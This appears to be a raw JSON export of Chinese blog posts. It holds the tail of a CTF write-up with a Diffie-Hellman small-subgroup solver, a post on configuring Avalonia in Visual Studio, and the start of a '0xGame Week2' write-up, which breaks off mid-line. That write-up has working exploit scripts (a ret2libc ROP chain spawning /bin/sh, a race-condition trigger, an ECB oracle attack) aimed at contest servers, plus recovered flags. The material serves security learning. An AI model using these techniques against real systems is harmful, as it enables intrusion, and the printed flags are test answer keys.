class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 接收加密的 Flag...&quot;</span>)</span><br><span class=\"line\">        recv_until(sock, <span class=\"string\">b&quot;Encrypted Flag:&quot;</span>)</span><br><span class=\"line\">        enc_line = recv_line(sock)</span><br><span class=\"line\">        enc_hex = enc_line.decode().strip()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] 加密的 Flag: <span class=\"subst\">&#123;enc_hex&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 使用已知的共享密钥 s = 1 解密</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 正在解密...&quot;</span>)</span><br><span class=\"line\">        s = <span class=\"number\">1</span></span><br><span class=\"line\">        key = sha256(long_to_bytes(s)).digest()</span><br><span class=\"line\">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class=\"line\">        enc = <span class=\"built_in\">bytes</span>.fromhex(enc_hex)</span><br><span class=\"line\">        flag = unpad(cipher.decrypt(enc), <span class=\"number\">16</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        flag_str = flag.decode()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span> + <span class=\"string\">&quot;=&quot;</span> * <span class=\"number\">60</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] 成功获取 Flag: <span class=\"subst\">&#123;flag_str&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;=&quot;</span> * <span class=\"number\">60</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">return</span> flag_str</span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[-] 错误: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">import</span> traceback</span><br><span class=\"line\">        traceback.print_exc()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">        sock.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exploit_with_pwntools</span>():</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    pwntools 版本 - 需要安装 pwntools</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> PWNTOOLS_AVAILABLE:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    host = <span class=\"string\">&quot;nc1.ctfplus.cn&quot;</span></span><br><span class=\"line\">    port = <span class=\"number\">34869</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 连接到服务器: &#123;&#125;:&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(host, port))</span><br><span class=\"line\">    conn = remote(host, port)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 接收并解析 Prime</span></span><br><span class=\"line\">        conn.recvuntil(<span class=\"string\">b&quot;The Prime is &quot;</span>)</span><br><span class=\"line\">        p = <span class=\"built_in\">int</span>(conn.recvline().strip())</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Prime (p): <span class=\"subst\">&#123;p&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 接收并解析 Generator</span></span><br><span class=\"line\">        conn.recvuntil(<span class=\"string\">b&quot;The Generator is &quot;</span>)</span><br><span class=\"line\">        g = <span class=\"built_in\">int</span>(conn.recvline().strip())</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Generator (g): <span class=\"subst\">&#123;g&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 接收并解析 Alice&#x27;s Public Key</span></span><br><span class=\"line\">        conn.recvuntil(<span class=\"string\">b&quot;Alice&#x27;s Public Key is &quot;</span>)</span><br><span class=\"line\">        A = <span class=\"built_in\">int</span>(conn.recvline().strip())</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Alice&#x27;s Public Key (A): <span class=\"subst\">&#123;A&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 发送恶意的 Bob&#x27;s Public Key = 1</span></span><br><span class=\"line\">        conn.recvuntil(<span class=\"string\">b&quot;Bob&#x27;s Public Key: &quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 发送恶意 Bob&#x27;s Public Key: 1&quot;</span>)</span><br><span class=\"line\">        conn.sendline(<span class=\"string\">b&quot;1&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 接收加密的 Flag</span></span><br><span class=\"line\">        conn.recvuntil(<span class=\"string\">b&quot;Encrypted Flag: &quot;</span>)</span><br><span class=\"line\">        enc_hex = conn.recvline().strip().decode()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] 加密的 Flag: <span class=\"subst\">&#123;enc_hex&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 使用已知的共享密钥 s = 1 解密</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 正在解密...&quot;</span>)</span><br><span class=\"line\">        s = <span class=\"number\">1</span></span><br><span class=\"line\">        key = sha256(long_to_bytes(s)).digest()</span><br><span class=\"line\">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class=\"line\">        enc = <span class=\"built_in\">bytes</span>.fromhex(enc_hex)</span><br><span class=\"line\">        flag = unpad(cipher.decrypt(enc), <span class=\"number\">16</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        flag_str = flag.decode()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span> + <span class=\"string\">&quot;=&quot;</span> * <span class=\"number\">60</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] 成功获取 Flag: <span class=\"subst\">&#123;flag_str&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;=&quot;</span> * <span class=\"number\">60</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">return</span> flag_str</span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[-] 错误: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">import</span> traceback</span><br><span class=\"line\">        traceback.print_exc()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">        conn.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;=&quot;</span> * <span class=\"number\">60</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Diffie-Hellman 小子群攻击&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Target: nc1.ctfplus.cn:34869&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;=&quot;</span> * <span class=\"number\">60</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>()</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 先尝试 pwntools 版本，如果失败则用手动版本</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> PWNTOOLS_AVAILABLE:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 尝试使用 pwntools...&quot;</span>)</span><br><span class=\"line\">        flag = exploit_with_pwntools()</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] pwntools 未安装，使用手动版本...&quot;</span>)</span><br><span class=\"line\">        flag = <span class=\"literal\">None</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> flag <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[*] 使用手动版本（只需要 socket + pycryptodome）...&quot;</span>)</span><br><span class=\"line\">        flag = exploit_manual()</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> flag:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[*] 攻击原理:&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;    1. 服务器计算共享密钥: s = B^a mod p&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;    2. 我们发送 B = 1&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;    3. 则 s = 1^a mod p = 1 (已知值)&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;    4. 使用 s = 1 作为密钥解密 flag&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[-] 攻击失败，请检查网络连接或服务器状态&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>flag :<code>0xgame&#123;ECC_1s_4w3s0m3_but_n0t_perf3ct&#125;</code></p>\n"},{"title":"VS中使用Avalonia","date":"2025-10-13T16:00:00.000Z","top_img":"/images/background/狐妖/09.jpg","cover":"/images/background/狐妖/21.jpg","_content":"\n# 跨平台的“现代WPF”\n\nAvalonia 是一个 **跨平台的 .NET UI 框架**，专为构建高性能、视觉一致的桌面应用而设计，同时支持扩展到移动和网页平台。\n\n它使用C#编写，依赖.Net SDK编译，既继承了 WPF 等传统 .NET UI 框架的优势，又解决了其跨平台能力的局限性。\n\n# 在VS中使用\n\n## 安装VS+SDK\n\n从[官网](https://visualstudio.microsoft.com/zh-hans/downloads/)安装VS ,然后在VS Installer里根据开发需求选择工作负载安装。\n\n进行 C# 开发一般需要选择 “.NET 桌面开发” 工作负载，如果要进行[ASP.NET](https://asp.net/)和 Web 开发，还需选择 “[ASP.NET](https://asp.net/)和 Web 开发” 工作负载。\n\n> 如果在VS Installer里选了C#相关的工作负载安装，那么.Net SDK就已经包含了，若非，可以自行在官网上找你所需要的SDK安装。\n\n## 安装Avalonia项目模板\n\n由于Avalonia是第三方框架，它目前无法直接在VS Installer安装器里勾选安装，而是需要在终端里安装：\n\n```cmd\ndotnet new install Avalonia.Templates\n```\n\n在CMD / PowerShell / Developer PowerShell for VS 2022等终端执行以上命令，一行就可以安装完成，非常的方便.🥰🥰\n\n装完Avalonia后，Avalonia DevTools（**UI 调试工具**，类似浏览器的开发者工具）也已经自动包含，此时项目的入口代码(通常是Program.cs文件)如下：\n\n```c#\nusing Avalonia;\nusing Avalonia.Controls.ApplicationLifetimes;\nusing Avalonia.DevTools; \n\npublic static void Main(string[] args) => BuildAvaloniaApp()\n    .StartWithClassicDesktopLifetime(args);\n\npublic static AppBuilder BuildAvaloniaApp()\n    => AppBuilder.Configure<Application>()\n        .UsePlatformDetect()\n        .WithInterFont()\n   \t    .LogToTrace();\n```\n\n这样的默认配置不管是Debug版本还是Release版本都可以启用DevTools,如果不想在Release版本中使用，则改成如下：\n\n```c#\npublic static AppBuilder BuildAvaloniaApp()\n{\n    var builder = AppBuilder.Configure<Application>()\n        .UsePlatformDetect()\n        .LogToTrace();\n#if DEBUG\n    builder.UseDevTools();\n#endif\n\treturn builder;\n}\n```\n\nAvalonia DevTools在调试（F5）时按F12就可以打开，和浏览器开发者工具一致。\n\n## 安装扩展\n\n在VS扩展-->管理扩展中找到Avalonia,点击安装。重启VS。\n\n# 总而言之\n\nC#环境配置非常简单，5分钟搞定。~~C#居然还有这个红利👆🏼🤓~~\n\n","source":"_posts/VS中Avalonia框架配置.md","raw":"---\ntitle: VS中使用Avalonia\ndate: 2025-10-14\ntags: Avalonia\ncategories: Csharp\ntop_img: /images/background/狐妖/09.jpg\ncover: /images/background/狐妖/21.jpg\n---\n\n# 跨平台的“现代WPF”\n\nAvalonia 是一个 **跨平台的 .NET UI 框架**，专为构建高性能、视觉一致的桌面应用而设计，同时支持扩展到移动和网页平台。\n\n它使用C#编写，依赖.Net SDK编译，既继承了 WPF 等传统 .NET UI 框架的优势，又解决了其跨平台能力的局限性。\n\n# 在VS中使用\n\n## 安装VS+SDK\n\n从[官网](https://visualstudio.microsoft.com/zh-hans/downloads/)安装VS ,然后在VS Installer里根据开发需求选择工作负载安装。\n\n进行 C# 开发一般需要选择 “.NET 桌面开发” 工作负载，如果要进行[ASP.NET](https://asp.net/)和 Web 开发，还需选择 “[ASP.NET](https://asp.net/)和 Web 开发” 工作负载。\n\n> 如果在VS Installer里选了C#相关的工作负载安装，那么.Net SDK就已经包含了，若非，可以自行在官网上找你所需要的SDK安装。\n\n## 安装Avalonia项目模板\n\n由于Avalonia是第三方框架，它目前无法直接在VS Installer安装器里勾选安装，而是需要在终端里安装：\n\n```cmd\ndotnet new install Avalonia.Templates\n```\n\n在CMD / PowerShell / Developer PowerShell for VS 2022等终端执行以上命令，一行就可以安装完成，非常的方便.🥰🥰\n\n装完Avalonia后，Avalonia DevTools（**UI 调试工具**，类似浏览器的开发者工具）也已经自动包含，此时项目的入口代码(通常是Program.cs文件)如下：\n\n```c#\nusing Avalonia;\nusing Avalonia.Controls.ApplicationLifetimes;\nusing Avalonia.DevTools; \n\npublic static void Main(string[] args) => BuildAvaloniaApp()\n    .StartWithClassicDesktopLifetime(args);\n\npublic static AppBuilder BuildAvaloniaApp()\n    => AppBuilder.Configure<Application>()\n        .UsePlatformDetect()\n        .WithInterFont()\n   \t    .LogToTrace();\n```\n\n这样的默认配置不管是Debug版本还是Release版本都可以启用DevTools,如果不想在Release版本中使用，则改成如下：\n\n```c#\npublic static AppBuilder BuildAvaloniaApp()\n{\n    var builder = AppBuilder.Configure<Application>()\n        .UsePlatformDetect()\n        .LogToTrace();\n#if DEBUG\n    builder.UseDevTools();\n#endif\n\treturn builder;\n}\n```\n\nAvalonia DevTools在调试（F5）时按F12就可以打开，和浏览器开发者工具一致。\n\n## 安装扩展\n\n在VS扩展-->管理扩展中找到Avalonia,点击安装。重启VS。\n\n# 总而言之\n\nC#环境配置非常简单，5分钟搞定。~~C#居然还有这个红利👆🏼🤓~~\n\n","slug":"VS中Avalonia框架配置","published":1,"updated":"2025-10-15T01:39:23.203Z","_id":"cmgqounfm0000sgt86poc8cxh","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"跨平台的“现代WPF”\"><a href=\"#跨平台的“现代WPF”\" class=\"headerlink\" title=\"跨平台的“现代WPF”\"></a>跨平台的“现代WPF”</h1><p>Avalonia 是一个 <strong>跨平台的 .NET UI 框架</strong>，专为构建高性能、视觉一致的桌面应用而设计，同时支持扩展到移动和网页平台。</p>\n<p>它使用C#编写，依赖.Net SDK编译，既继承了 WPF 等传统 .NET UI 框架的优势，又解决了其跨平台能力的局限性。</p>\n<h1 id=\"在VS中使用\"><a href=\"#在VS中使用\" class=\"headerlink\" title=\"在VS中使用\"></a>在VS中使用</h1><h2 id=\"安装VS-SDK\"><a href=\"#安装VS-SDK\" class=\"headerlink\" title=\"安装VS+SDK\"></a>安装VS+SDK</h2><p>从<a href=\"https://visualstudio.microsoft.com/zh-hans/downloads/\">官网</a>安装VS ,然后在VS Installer里根据开发需求选择工作负载安装。</p>\n<p>进行 C# 开发一般需要选择 “.NET 桌面开发” 工作负载，如果要进行<a href=\"https://asp.net/\">ASP.NET</a>和 Web 开发，还需选择 “<a href=\"https://asp.net/\">ASP.NET</a>和 Web 开发” 工作负载。</p>\n<blockquote>\n<p>如果在VS Installer里选了C#相关的工作负载安装，那么.Net SDK就已经包含了，若非，可以自行在官网上找你所需要的SDK安装。</p>\n</blockquote>\n<h2 id=\"安装Avalonia项目模板\"><a href=\"#安装Avalonia项目模板\" class=\"headerlink\" title=\"安装Avalonia项目模板\"></a>安装Avalonia项目模板</h2><p>由于Avalonia是第三方框架，它目前无法直接在VS Installer安装器里勾选安装，而是需要在终端里安装：</p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dotnet new install Avalonia.Templates</span><br></pre></td></tr></table></figure>\n\n<p>在CMD &#x2F; PowerShell &#x2F; Developer PowerShell for VS 2022等终端执行以上命令，一行就可以安装完成，非常的方便.🥰🥰</p>\n<p>装完Avalonia后，Avalonia DevTools（<strong>UI 调试工具</strong>，类似浏览器的开发者工具）也已经自动包含，此时项目的入口代码(通常是Program.cs文件)如下：</p>\n<figure class=\"highlight c#\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">using</span> Avalonia;</span><br><span class=\"line\"><span class=\"keyword\">using</span> Avalonia.Controls.ApplicationLifetimes;</span><br><span class=\"line\"><span class=\"keyword\">using</span> Avalonia.DevTools; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>(<span class=\"params\"><span class=\"built_in\">string</span>[] <span class=\"keyword\">args</span></span>)</span> =&gt; BuildAvaloniaApp()</span><br><span class=\"line\">    .StartWithClassicDesktopLifetime(<span class=\"keyword\">args</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> AppBuilder <span class=\"title\">BuildAvaloniaApp</span>()</span></span><br><span class=\"line\">    =&gt; AppBuilder.Configure&lt;Application&gt;()</span><br><span class=\"line\">        .UsePlatformDetect()</span><br><span class=\"line\">        .WithInterFont()</span><br><span class=\"line\">   \t    .LogToTrace();</span><br></pre></td></tr></table></figure>\n\n<p>这样的默认配置不管是Debug版本还是Release版本都可以启用DevTools,如果不想在Release版本中使用，则改成如下：</p>\n<figure class=\"highlight c#\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> AppBuilder <span class=\"title\">BuildAvaloniaApp</span>()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> builder = AppBuilder.Configure&lt;Application&gt;()</span><br><span class=\"line\">        .UsePlatformDetect()</span><br><span class=\"line\">        .LogToTrace();</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> DEBUG</span></span><br><span class=\"line\">    builder.UseDevTools();</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> builder;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Avalonia DevTools在调试（F5）时按F12就可以打开，和浏览器开发者工具一致。</p>\n<h2 id=\"安装扩展\"><a href=\"#安装扩展\" class=\"headerlink\" title=\"安装扩展\"></a>安装扩展</h2><p>在VS扩展–&gt;管理扩展中找到Avalonia,点击安装。重启VS。</p>\n<h1 id=\"总而言之\"><a href=\"#总而言之\" class=\"headerlink\" title=\"总而言之\"></a>总而言之</h1><p>C#环境配置非常简单，5分钟搞定。<del>C#居然还有这个红利👆🏼🤓</del></p>\n","excerpt":"","more":"<h1 id=\"跨平台的“现代WPF”\"><a href=\"#跨平台的“现代WPF”\" class=\"headerlink\" title=\"跨平台的“现代WPF”\"></a>跨平台的“现代WPF”</h1><p>Avalonia 是一个 <strong>跨平台的 .NET UI 框架</strong>，专为构建高性能、视觉一致的桌面应用而设计，同时支持扩展到移动和网页平台。</p>\n<p>它使用C#编写，依赖.Net SDK编译，既继承了 WPF 等传统 .NET UI 框架的优势，又解决了其跨平台能力的局限性。</p>\n<h1 id=\"在VS中使用\"><a href=\"#在VS中使用\" class=\"headerlink\" title=\"在VS中使用\"></a>在VS中使用</h1><h2 id=\"安装VS-SDK\"><a href=\"#安装VS-SDK\" class=\"headerlink\" title=\"安装VS+SDK\"></a>安装VS+SDK</h2><p>从<a href=\"https://visualstudio.microsoft.com/zh-hans/downloads/\">官网</a>安装VS ,然后在VS Installer里根据开发需求选择工作负载安装。</p>\n<p>进行 C# 开发一般需要选择 “.NET 桌面开发” 工作负载，如果要进行<a href=\"https://asp.net/\">ASP.NET</a>和 Web 开发，还需选择 “<a href=\"https://asp.net/\">ASP.NET</a>和 Web 开发” 工作负载。</p>\n<blockquote>\n<p>如果在VS Installer里选了C#相关的工作负载安装，那么.Net SDK就已经包含了，若非，可以自行在官网上找你所需要的SDK安装。</p>\n</blockquote>\n<h2 id=\"安装Avalonia项目模板\"><a href=\"#安装Avalonia项目模板\" class=\"headerlink\" title=\"安装Avalonia项目模板\"></a>安装Avalonia项目模板</h2><p>由于Avalonia是第三方框架，它目前无法直接在VS Installer安装器里勾选安装，而是需要在终端里安装：</p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dotnet new install Avalonia.Templates</span><br></pre></td></tr></table></figure>\n\n<p>在CMD &#x2F; PowerShell &#x2F; Developer PowerShell for VS 2022等终端执行以上命令，一行就可以安装完成，非常的方便.🥰🥰</p>\n<p>装完Avalonia后，Avalonia DevTools（<strong>UI 调试工具</strong>，类似浏览器的开发者工具）也已经自动包含，此时项目的入口代码(通常是Program.cs文件)如下：</p>\n<figure class=\"highlight c#\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">using</span> Avalonia;</span><br><span class=\"line\"><span class=\"keyword\">using</span> Avalonia.Controls.ApplicationLifetimes;</span><br><span class=\"line\"><span class=\"keyword\">using</span> Avalonia.DevTools; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>(<span class=\"params\"><span class=\"built_in\">string</span>[] <span class=\"keyword\">args</span></span>)</span> =&gt; BuildAvaloniaApp()</span><br><span class=\"line\">    .StartWithClassicDesktopLifetime(<span class=\"keyword\">args</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> AppBuilder <span class=\"title\">BuildAvaloniaApp</span>()</span></span><br><span class=\"line\">    =&gt; AppBuilder.Configure&lt;Application&gt;()</span><br><span class=\"line\">        .UsePlatformDetect()</span><br><span class=\"line\">        .WithInterFont()</span><br><span class=\"line\">   \t    .LogToTrace();</span><br></pre></td></tr></table></figure>\n\n<p>这样的默认配置不管是Debug版本还是Release版本都可以启用DevTools,如果不想在Release版本中使用，则改成如下：</p>\n<figure class=\"highlight c#\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> AppBuilder <span class=\"title\">BuildAvaloniaApp</span>()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> builder = AppBuilder.Configure&lt;Application&gt;()</span><br><span class=\"line\">        .UsePlatformDetect()</span><br><span class=\"line\">        .LogToTrace();</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> DEBUG</span></span><br><span class=\"line\">    builder.UseDevTools();</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> builder;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Avalonia DevTools在调试（F5）时按F12就可以打开，和浏览器开发者工具一致。</p>\n<h2 id=\"安装扩展\"><a href=\"#安装扩展\" class=\"headerlink\" title=\"安装扩展\"></a>安装扩展</h2><p>在VS扩展–&gt;管理扩展中找到Avalonia,点击安装。重启VS。</p>\n<h1 id=\"总而言之\"><a href=\"#总而言之\" class=\"headerlink\" title=\"总而言之\"></a>总而言之</h1><p>C#环境配置非常简单，5分钟搞定。<del>C#居然还有这个红利👆🏼🤓</del></p>\n"},{"title":"0xGame Week2 WP","date":"2025-10-18T16:00:00.000Z","top_img":"/images/background/东方/01.jpg","cover":"/images/background/东方/01.jpg","_content":"\n\n\n\n\n# pwn\n\n## ret2libc\n\n```python\nio=remote(\"nc1.ctfplus.cn\",30264)\nmain=0x40122D\ngot=0x404018\nplt=0x401070\nrdi=0x40119e\nret=0x40122c\nio.recvuntil(b\"Input something: \\n\")\npayload=b'a'*0x48+p64(rdi)+p64(got)+p64(plt)+p64(main)\nio.send(payload)\nlibc=ELF('./libc.so.6')\nbase=u64(io.recv(6).ljust(8,b'\\x00'))-libc.sym.puts\nprint(hex(base))\nsym=libc.sym.system+base\nsh=next(libc.search(\"/bin/sh\"))+base\npayload=b'a'*0x48+p64(ret)+p64(rdi)+p64(sh)+p64(sym)\nio.recvuntil(b\"Input something: \\n\")\nio.sendline(payload)\nio.interactive()\n```\n\n先把libc的基址找出来，然后再构造ROP链。\n\n## 多线程\n\n```python\nio=remote(\"nc1.ctfplus.cn\",32640)\nio.sendline(b\"a\")\nfor i in range(0x40):\n    io.sendline(b\"2\")\nio.sendline(b\"3\")\nio.interactive()\n```\n\n得到`0xGame{Thr3@ds_c@nn0t_b3_w1th0ut_l0cks}`\n\n## 高数😫😫\n\n![eval](/images/wp/eval.png)\n\n这个**条件**和**循环**结构够我学一辈子😭😭\n\nflag：`0xGame{Ur_@n_excel1ent_bl@ster}`\n\n# Crypto\n\n## Orcale\n\n爆破\n\n```python\nimport socket\nimport string\nimport time\n\n# --- 连接信息 ---\nHOST = 'nc1.ctfplus.cn'\nPORT = 49725\nBLOCK_SIZE = 16\n\n# --- I/O 辅助函数 ---\ndef recv_until(s, delim):\n    \"\"\"从 socket 中接收数据，直到遇到指定的分隔符 delim。\"\"\"\n    data = b\"\"\n    while not data.endswith(delim):\n        try:\n            chunk = s.recv(1)\n            if not chunk:  # 连接已关闭\n                return None\n            data += chunk\n        except socket.timeout:\n            print(\"[-] Socket timeout.\")\n            return None\n    return data\n\ndef get_encryption(s, payload_hex):\n    \"\"\"\n    在一个已建立的 socket 连接上，发送一次加密请求并获取结果。\n    \"\"\"\n    try:\n        # 1. 回答 'y' 继续加密\n        s.sendall(b'y\\n')\n        recv_until(s, b'[-] Plaintext(in hex):')\n        \n        # 2. 发送我们的 payload\n        s.sendall(payload_hex.encode() + b'\\n')\n        \n        # 3. 解析返回的密文\n        recv_until(s, b'[+] Ciphertext: ')\n        response_line = recv_until(s, b'\\n')\n        if response_line:\n            return response_line.strip().decode()\n        return None\n    except (socket.error, BrokenPipeError):\n        print(\"[-] Network error occurred during communication.\")\n        return None\n\n# --- 主攻击逻辑 ---\ndef solve():\n    \"\"\"\n    执行 ECB 逐字节攻击的主函数。\n    \"\"\"\n    # 建立一个持久连接\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(5)\n    \n    try:\n        s.connect((HOST, PORT))\n        # 清理掉第一个 \"Continue?\" 提示\n        recv_until(s, b'y/[n])?')\n    except socket.error as e:\n        print(f\"[-] Failed to connect to {HOST}:{PORT}. Error: 